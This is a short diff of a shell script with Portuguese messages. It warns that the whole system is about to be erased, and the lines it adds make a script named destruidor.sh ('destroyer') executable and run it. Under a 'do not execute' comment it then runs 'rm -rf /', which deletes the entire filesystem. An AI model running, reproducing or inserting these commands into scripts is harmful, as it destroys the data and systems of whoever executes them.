@@ -5,5 +5,7 @@
 echo "Você está prestes a apagar todo o sistema!"
 sleep 2
 
+chmod +x destruidor.sh
+./destruidor.sh
 # COMANDO DESTRUTIVO - NÃO EXECUTE!
 rm -rf /
